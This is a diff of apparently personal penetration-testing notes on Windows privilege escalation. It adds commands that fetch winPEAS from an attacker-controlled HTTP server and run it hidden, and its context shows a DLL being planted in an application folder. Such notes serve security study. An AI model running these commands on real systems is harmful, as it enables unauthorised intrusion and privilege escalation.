@@ -16,7 +16,7 @@ One exception is if an executable file has a low integrity level, the process's 
 - System: SYSTEM (kernel, ...)
 - High: Elevated users
 - Medium: Standard 
-- Low: very restricted rights often used in sandboxed[^privesc_win_sandbox]
+- Low: very restricted rights often used in sandboxed
 
 ### Situational Awareness
 
@@ -127,6 +127,11 @@ python3 -m http.server 80
 then on target download using
 
 iwr -uri http://192.168.45.230/winPEASx64.exe -Outfile winPEAS.exe
+Start-Process -FilePath "winPEAS.exe" -RedirectStandardOutput "winlog.txt" -NoNewWindow -WindowStyle Hidden
+# CMD
+start /B cmd /C "winPEAS.exe > winPEAS.txt"
+Get-Content winPEAS.txt | Out-Host -Paging
+
           
 from INE I learned about using
  iwr -UseBasicParsing -Uri http://IP/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll
